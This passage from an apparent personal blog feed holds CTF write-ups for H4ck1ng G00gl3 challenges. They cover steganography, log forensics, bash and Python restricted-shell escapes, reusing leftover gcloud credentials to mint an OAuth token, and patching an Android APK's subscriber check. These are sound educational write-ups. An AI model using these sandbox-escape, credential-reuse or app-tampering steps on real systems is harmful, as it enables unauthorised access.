files to the &lt;code&gt;posts&lt;/code&gt; folder of the &lt;code&gt;development&lt;/code&gt; branch. The GitHub
Actions workflow will publish them.&lt;/p&gt;
&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;We presented an easier way to deploy your posts with &lt;strong&gt;org-mode&lt;/strong&gt;,
&lt;strong&gt;hugo&lt;/strong&gt;, &lt;strong&gt;GitHub Actions&lt;/strong&gt; and &lt;strong&gt;GitHub Pages&lt;/strong&gt;. With that workflow,
we only need to focus on writing org-mode files. Lastly, we know this
workflow works because we used it to deploy this post!!!&lt;/p&gt;
&lt;p&gt;I hope you liked it and that you have learned something!&lt;/p&gt;
</content:encoded><image>https://danielorihuela.dev/_astro/deploy-blog.BtZybPcF.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>H4ck1ng G00gl3 ep002 challenge 01</title><link>https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep002ch01/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep002ch01/</guid><description>Crack H4ck1ng G00gl3 ep002 challenge 01: decode steganography in an image, use LSB technique and extract hidden messages from SSL certificates.</description><pubDate>Thu, 03 Nov 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#learning-journey&quot;&gt;Learning Journey&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Introduction&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;https://h4ck1ng.google/&quot;&gt;H4ck1ng G00gl3&lt;/a&gt; is a series of security
challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only way to win is to
think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep002
challenge 01&lt;/strong&gt;. This challenge is about &lt;strong&gt;Steganography&lt;/strong&gt;.&lt;/p&gt;
&lt;h1&gt;Learning Journey&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep002ch01/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The challenge gives us the following image.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep002ch01/challenge.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;It&apos;s an RGBA file.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep002ch01/challenge-info.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The first thing that came to mind with my basic knowledge of image
steganography was the &lt;strong&gt;LSB&lt;/strong&gt; (i.e. Least-Significant Bit) technique. I
tried tens of different already built scripts and online tools. But I
couldn&apos;t find anything interesting. After a couple of hours, I started
to doubt if I was going down the rabbit hole. I reread the hint but got
no clue on how to proceed. It was time to ask the community for help.&lt;/p&gt;
&lt;p&gt;The community pointed me to the hint:
&lt;code&gt;Sometimes the answers are hidden in plain site&lt;/code&gt;. Also, they told me to
take a look at the main webpage background. We can see the same image. I
downloaded it and extracted the strings, which got me the following.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep002ch01/website-strings.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Here, we have some information.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The information is hidden inside an &lt;strong&gt;SSL certificate&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;LSB&lt;/strong&gt; steganography technique is used&lt;/li&gt;
&lt;li&gt;The attackers used an online tool&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;After all, I was right about the &lt;strong&gt;LSB&lt;/strong&gt; technique. Why couldn&apos;t I get
anything with the myriad of tools I used? I don&apos;t know. I decided to
write my own script.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import sys
import numpy as np
from PIL import Image

img = Image.open(&apos;challenge.png&apos;, &apos;r&apos;)
pixels = np.array(list(img.getdata()))
rgba_values = [values for pixel in pixels for values in pixel]
least_significant_bits = &apos;&apos;.join([bin(value)[-1] for value in rgba_values])
hidden_bytes = [least_significant_bits[i:i+8] for i in range(0, len(least_significant_bits), 8)]
hidden_message = [chr(int(byte, 2)) for byte in hidden_bytes]

print(&apos;&apos;.join(hidden_message))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I was finally able to get something.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep002ch01/certificate.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The next step was getting the flag from the certificate. I saved the
result from the script into a file called &quot;certificate.ssl&quot; and executed
the following.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;openssl x509 -text -noout -in certificate.ssl
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;After getting the output, we can see the flag in the &lt;strong&gt;issuer&lt;/strong&gt; field.
With that, we completed the challenge.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep002ch01/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>H4ck1ng G00gl3 ep002 challenge 02</title><link>https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep002ch02/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep002ch02/</guid><description>Explore H4ck1ng G00gl3 ep002 challenge 02: install Timesketch via Docker, analyze logs, and uncover the flag in this thrilling forensics journey.</description><pubDate>Fri, 04 Nov 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#learning-journey&quot;&gt;Learning Journey&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Introduction&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;https://h4ck1ng.google/&quot;&gt;H4ck1ng G00gl3&lt;/a&gt; is a series of security
challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only way to win is to
think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep002
challenge 02&lt;/strong&gt;. This challenge is about &lt;strong&gt;Forensics&lt;/strong&gt;.&lt;/p&gt;
&lt;h1&gt;Learning Journey&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep002ch02/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The challenge gives us a zip containing a readme file and the logs in a
csv file. The readme explains how to install timesketch using docker.
Once installed, we can import the logs and check the latest one. There,
you will find the flag. With that, we completed the challenge.&lt;/p&gt;
</content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>H4ck1ng G00gl3 ep002 challenge 03</title><link>https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep002ch03/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep002ch03/</guid><description>Escape a restricted shell in H4ck1ng G00gl3 ep002 challenge 03. Override builtin functions and use Bash tricks to find and reveal the flag.</description><pubDate>Sat, 05 Nov 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#learning-journey&quot;&gt;Learning Journey&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Introduction&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;https://h4ck1ng.google/&quot;&gt;H4ck1ng G00gl3&lt;/a&gt; is a series of security
challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only way to win is to
think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep002
challenge 03&lt;/strong&gt;. This challenge is about &lt;strong&gt;Escaping Restricted Shell&lt;/strong&gt;.&lt;/p&gt;
&lt;h1&gt;Learning Journey&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep002ch03/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The description tells us how to connect to a remote shell.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep002ch03/quarantineshell.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Once connected, we get access to a shell. It has a peculiarity, though.
We cannot execute any commands because they are blocked. However, it
tells us to check the completions to see the available ones. Therefore,
I pressed the &lt;strong&gt;tab&lt;/strong&gt; key a few times to see them.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep002ch03/available-commands.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The flag, as in other challenges, can be found in the root folder. We
can check it by writing &quot;ls /&quot; and then pressing the &lt;strong&gt;tab&lt;/strong&gt; a couple of
times to see the available files and directories.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep002ch03/ls-flag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;I was stuck. I did not know what to do. I had to ask the community for a
hint. The trick is overriding a builtin function. The &lt;a href=&quot;https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html&quot;&gt;bash
documentation&lt;/a&gt;
says:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Bash allows a function to override a builtin with the same name, and
provides access to that builtin’s functionality within the function
via the builtin and command builtins (see Bash Builtin Commands).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;That means we can &lt;strong&gt;overwrite one of the builtin functions&lt;/strong&gt; available
to try and read the flag. I tried with a couple of functions but did not
manage to override them. I asked for another hint. We have to use the
&quot;&lt;strong&gt;echo&lt;/strong&gt;&quot; function. Executing the following commands will change its
behaviour and return the flag.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;echo () { /bin/cat /flag; }
echo
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;With that, we completed the challenge.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep002ch03/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>H4ck1ng G00gl3 ep003 challenge 01</title><link>https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep003ch01/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep003ch01/</guid><description>Decode H4ck1ng G00gl3 ep003 challenge 01: navigate restricted shells, extract tokens, and uncover the flag using OAuth 2.0 and JWT.</description><pubDate>Wed, 09 Nov 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#learning-journey&quot;&gt;Learning Journey&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Introduction&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;https://h4ck1ng.google/&quot;&gt;H4ck1ng G00gl3&lt;/a&gt; is a series of security
challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only way to win is to
think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep003
challenge 01&lt;/strong&gt;. Category &lt;strong&gt;Misc&lt;/strong&gt;.&lt;/p&gt;
&lt;h1&gt;Learning Journey&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch01/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The description tell us how to connect to the machine with socat.
However, it requires a password. I tried to guess it with no luck. I
watched the episode video again but didn&apos;t find anything interesting. I
even tried searching for vulnerabilities or brute force scripts
targeting socat. Nothing of that worked. I asked the community for a
hint. They told me to check the &lt;strong&gt;intro&lt;/strong&gt; tab of the episode.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch01/password-hint.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;I believe I never read the introductions to the different challenges,
but it was necessary this time. There, we can see two times at which the
episode video might show something interesting. If we &lt;strong&gt;stop the episode
at 15:09&lt;/strong&gt; we will see the password.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch01/video-password.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;We can access the machine now.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch01/developer-shell.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;In the home directory, we find three files: backup.py, login.sh and
todo.txt. The login.sh contains the code executed when connecting with
socat, nothing of interest. However, the other two files contain
relevant information. I decided to check the &lt;strong&gt;backup.py&lt;/strong&gt; first.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch01/backup-code.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;It&apos;s a simple unfinished script. The script creates the backup of a
document, probably the one we need to get. The problem is that &lt;strong&gt;we need
an access token to get the file&lt;/strong&gt;. Unlucky for us, the function that
gets the token hasn&apos;t been implemented. In any case, we can see framed
in red the base URL and the document id. Hence, we know the document is
at
&lt;a href=&quot;https://docs.googleapis.com/v1/documents/1Z7CQDJhCj1G5ehvM3zB3FyxsCfdvierd1fs0UBlzFFM&quot;&gt;https://docs.googleapis.com/v1/documents/1Z7CQDJhCj1G5ehvM3zB3FyxsCfdvierd1fs0UBlzFFM&lt;/a&gt;.
Besides, we have to use &lt;strong&gt;RFC 6749: The OAuth 2.0 Authorization
framework&lt;/strong&gt;. We know it from the challenge hint,
&lt;code&gt;Hint: Find the key, and put RFC 6749 to use&lt;/code&gt;. That means we need to get
the &lt;strong&gt;access token&lt;/strong&gt; using the &lt;strong&gt;OAuth 2.0 framework&lt;/strong&gt;. I wrote this
down and kept collecting information.&lt;/p&gt;
&lt;p&gt;I opened the &lt;strong&gt;todo.txt&lt;/strong&gt; file and saw the following:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Today
[x] Added backup-tool@project-multivision.iam.gserviceaccount.com with viewer-access to super sensitive design doc
[x] Tried activating service account with gcloud, but didn&apos;t give me a documents.readonly scope
[x] Cleaned up service account key from disk before signing off

Tomorrow
[] Finish writing Google Drive backup script
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We can read that the developer used a &lt;strong&gt;service account with gcloud&lt;/strong&gt;.
He also mentions something about a &lt;strong&gt;&quot;documents.readonly&quot; scope&lt;/strong&gt; and
that he removed the key from the disk. That is unfortunate because we
need it to get the access token.&lt;/p&gt;
&lt;p&gt;At this point, I did not know what to do or how to proceed. I read
diagonally the RFC 6749 and searched for information about OAuth2.0 on
internet but did not find anything that could help me. For no reason, I
thought it was worth returning to the developer machine to navigate the
directories and see if I could find anything. After some time, I found
something that caught my attention. A &lt;strong&gt;hidden folder named &quot;.config&lt;/strong&gt;&quot;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch01/ls-hidden.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;This folder contains a &lt;strong&gt;gcloud folder with promising files&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch01/gcloud-config-files.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Remember that we needed an access token? Well…, there we have a
&lt;strong&gt;access_tokens.db&lt;/strong&gt;, which includes &lt;strong&gt;an old access token and a JWT&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch01/old-access-token.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;We can paste the token into the &lt;a href=&quot;https://jwt.io/&quot;&gt;https://jwt.io/&lt;/a&gt; webpage and see which
information is inside.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch01/decoded-access-token.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;We are progressing. Still, we don&apos;t know the information we have to
include in the JWT to get a new access token, and we don&apos;t have the
private key to sign it. I returned to the &lt;strong&gt;.config/gcloud&lt;/strong&gt; folder to
search for the private key. There, we see a file called
&lt;strong&gt;credentials.db&lt;/strong&gt;, which contains the &lt;strong&gt;private key&lt;/strong&gt; and the &lt;strong&gt;token
URI&lt;/strong&gt;, among other information we don&apos;t need.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch01/private-key.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Now we have all the required information.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;JWT with some information&lt;/li&gt;
&lt;li&gt;Private key to sign the token&lt;/li&gt;
&lt;li&gt;document URL&lt;/li&gt;
&lt;li&gt;Token URI to get the access token&lt;/li&gt;
&lt;li&gt;The backup is done with a service account&lt;/li&gt;
&lt;li&gt;The scope is related to documents.readonly&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We only need to find the correct steps we have to follow to get a valid
access token and eventually get the document. After wandering through
several blogs, tutorials, videos and documentation, I found some Google
documentation explaining &lt;a href=&quot;https://developers.google.com/identity/protocols/oauth2/service-account#authorizingrequests&quot;&gt;how to use OAuth 2.0 for Server to Server
Application&lt;/a&gt;.
There, we can see the information the access token must contain and how
to send the POST request. First, we have to build a valid access token.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch01/new-jwt.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The header stays the same. However, we needed to modify the payload. The
&lt;strong&gt;iat field timestamp is the current timestamp&lt;/strong&gt;, and the &lt;strong&gt;exp field
timestamp is one hour from now in the future&lt;/strong&gt;. Moreover, we initially
&lt;strong&gt;set the scope field to
&quot;&lt;a href=&quot;https://www.googleapis.com/auth/documents.readonly&quot;&gt;https://www.googleapis.com/auth/documents.readonly&lt;/a&gt;&quot;&lt;/strong&gt;. We can see the
different authorization scopes available for a document GET request at
&lt;a href=&quot;https://developers.google.com/docs/api/reference/rest/v1/documents/get&quot;&gt;https://developers.google.com/docs/api/reference/rest/v1/documents/get&lt;/a&gt;.
We are now in good shape to &lt;strong&gt;send a POST request to get a valid
access_token&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch01/post-token.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Great, we got a new access token! The last step is &lt;strong&gt;sending a GET
request to the document URL&lt;/strong&gt; with the &lt;strong&gt;access token in the
Authorization header&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch01/get-blueprints.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Perfect! We received the response with the blueprints! Finally, we need
to search for the flag in the response. With that, we completed the
challenge.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch01/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>H4ck1ng G00gl3 ep003 challenge 02</title><link>https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep003ch02/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep003ch02/</guid><description>Decode H4ck1ng G00gl3 ep003 challenge 02: use the Konami cheat code, escape a restricted Python shell, and reveal the hidden flag.</description><pubDate>Sun, 13 Nov 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#learning-journey&quot;&gt;Learning Journey&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Introduction&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;https://h4ck1ng.google/&quot;&gt;H4ck1ng G00gl3&lt;/a&gt; is a series of security
challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only way to win is to
think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep003
challenge 02&lt;/strong&gt;. Category &lt;strong&gt;Escape Restricted Shell&lt;/strong&gt;.&lt;/p&gt;
&lt;h1&gt;Learning Journey&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch02/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The description gives us the command to connect to a remote machine.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch02/greeting.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch02/game.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;At this point, we can try winning the game or cheating, as the hint
suggests. At first, I tried to play the game for a while, searching for
clues on how to cheat it. I could not find a way. I was recovering a lot
of coordinates and images that didn&apos;t make sense and didn&apos;t help me.
Later I learned that they are related to the bonus challenge for this
episode. After dying a couple of times, the game became tedious, and I
didn&apos;t find a way to cheat. I asked the community for help. The hint is
related to the &lt;a href=&quot;https://www.digitaltrends.com/gaming/famous-cheat-codes-in-video-games/#:~:text=In%20its%20most%20famous%20form,a%20cakewalk%20with%20the%20code&quot;&gt;famous Konami cheat
code&lt;/a&gt;.
After introducing it, we get to another screen where we can input text.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch02/cd-home.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Notice that it won&apos;t execute any command. We need to do some research.
First, I &lt;strong&gt;copied the error output of the command &quot;cd ~&quot;&lt;/strong&gt; into the
Google search engine.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch02/shell-may-be-python.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;We can try to execute a python function to check if it&apos;s a python shell
and its version. In that case, I decided to call:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;print &quot;asd&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch02/shell-is-python3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;By the given output, we can see that the &lt;strong&gt;shell is running python
version 3&lt;/strong&gt;. Lucky me, I found a &lt;a href=&quot;https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#python3&quot;&gt;webpage with tricks to scape from
restricted python3
shells&lt;/a&gt;.
That page shows how to access the &lt;strong&gt;builtins&lt;/strong&gt; module, for example.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch02/print-len-self.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The &lt;a href=&quot;https://docs.python.org/3/library/builtins.html&quot;&gt;builtins&lt;/a&gt; module
gives access to several functions, one of them being the &lt;strong&gt;open&lt;/strong&gt;
function. That means that we can open a file and read it. We know from
past challenges that the flag file is at the root directory, and
therefore, we can get the flag with&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;print(len.__self__.open(&apos;flag&apos;).read())
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;With that, we completed the challenge.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch02/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded><image>https://danielorihuela.dev/_astro/hacking-google-2022.Cm7LR77H.png</image><author>danielorihuelarodriguez@gmail.com (Daniel Orihuela)</author></item><item><title>H4ck1ng G00gl3 ep003 challenge 03</title><link>https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep003ch03/</link><guid isPermaLink="true">https://danielorihuela.dev/blog/h4ck1ng-g00gl3-ep003ch03/</guid><description>Hack your way through H4ck1ng G00gl3 ep003 challenge 03. Decompile, modify the apk, and scan the QR code to reveal the hidden flag.</description><pubDate>Sun, 13 Nov 2022 00:00:00 GMT</pubDate><content:encoded>&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#learning-journey&quot;&gt;Learning Journey&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Introduction&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;https://h4ck1ng.google/&quot;&gt;H4ck1ng G00gl3&lt;/a&gt; is a series of security
challenges published on &lt;strong&gt;October 2022&lt;/strong&gt; where the only way to win is to
think like a hacker. In this post, I explain how I solved &lt;strong&gt;ep003
challenge 03&lt;/strong&gt;. Category &lt;strong&gt;Android&lt;/strong&gt;.&lt;/p&gt;
&lt;h1&gt;Learning Journey&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch03/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Opening the challenge gives us a zip containing two files: an apk and a
QR code. First things first, let&apos;s install the application and see if we
can scan the QR code and what&apos;s the result.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch03/original-app.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The QR code returns the Secret flag data. However, it seems like we have
to be a subscriber to get the URL field where I guess the flag is
hidden. I&apos;m pretty sure we can modify the apk in a way that shows us the
flag. To do that, we have to obtain the source code first. There is a
tool called &lt;a href=&quot;https://github.com/pxb1988/dex2jar&quot;&gt;dex2jar&lt;/a&gt; that extracts
the jar file from the apk.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch03/apk-to-jar.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Then, we can use &lt;a href=&quot;https://java-decompiler.github.io/&quot;&gt;jd-gui&lt;/a&gt; to open
the jar file and look at the source code. Once we have it, there is no
trick. We have to read it and find where the vulnerability is. In that
case, I found &lt;strong&gt;the signature of the HTTP request was different between
a subscribed and an unsubscribed user&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch03/jdgui-networkktclass.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;I wondered how the application knew if a user was a subscriber. After
searching through the code, I found the &lt;strong&gt;&quot;CorgiRequest&quot; class with the
&quot;isSubscriber&quot; field&lt;/strong&gt;, initialized in the constructor. In other words,
if we set the &quot;isSubscriber&quot; field to true when the class is created, we
might get the flag.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch03/jdgui-is-subscriber-field.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;To modify the application, we are going to use the
&lt;a href=&quot;https://github.com/APKLab/APKLab&quot;&gt;APKLab&lt;/a&gt; VsCode plugin. First, we are
going to decompile it.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch03/apklab-decompile-args-error.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Decompiling the resources gave me an error, so I tried decompiling all
except the resources.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch03/apklab-decompile-error-message.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch03/apklab-decompile-args.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;After decompiling it, we will have access to the code in the Smali
language. It&apos;s a low-level language, and it&apos;s harder to understand. We
know we have to modify the constructor class of the CorgiRequest class.
For that challenge, the change is tiny.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch03/apklab-modification.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Now we need to recompile the code into an apk and sign it.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch03/apklab-compile-sign.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The last step is to install this new apk and run it. Now, the flag will
appear after scanning the QR code. With that, we completed the
challenge.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../../images/h4ck1ng00gl3ep003ch03/intro.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
